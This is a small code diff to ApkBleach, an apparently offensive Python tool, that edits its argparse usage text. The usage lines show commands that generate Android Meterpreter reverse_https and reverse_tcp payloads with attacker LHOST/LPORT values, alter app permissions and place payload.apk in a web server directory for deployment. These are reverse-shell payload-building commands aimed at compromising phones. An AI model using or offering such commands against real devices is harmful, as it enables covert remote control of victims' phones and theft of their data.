@@ -28,7 +28,7 @@ class ApkBleach:
 	def __init__(self):
 		arg_parser = argparse.ArgumentParser(
 			prog="ApkBleach",
-			usage="\napkbleach -g android/meterpreter/reverse_https LHOST=Address LPORT=port -s 2 -i BLEACH_settings --edit-permissions -o /var/www/html/payload.apk\n\napkbleach -g android/meterpreter/reverse_tcp -s 2 --edit-permissions --deploy-all\n\napkbleach --list-payloads\n apkbleach --list-icons\n apkbleach --clear-cache",
+			usage="\napkbleach -g android/meterpreter/reverse_https LHOST=Address LPORT=port -s 2 -i BLEACH_settings --edit-permissions -o /var/www/html/payload.apk\n\napkbleach -g android/meterpreter/reverse_tcp LHOST=address LPORT=port -s 2 --edit-permissions --deploy-all\n\napkbleach --list-payloads\n apkbleach --list-icons\n apkbleach --clear-cache",
 			formatter_class=RawTextHelpFormatter
 			)
 		arg_parser.add_argument("-g", nargs=3, dest='generate', metavar=("[PAYLOAD]","[LHOST]", "[LPORT]"), help="Generates a payload")
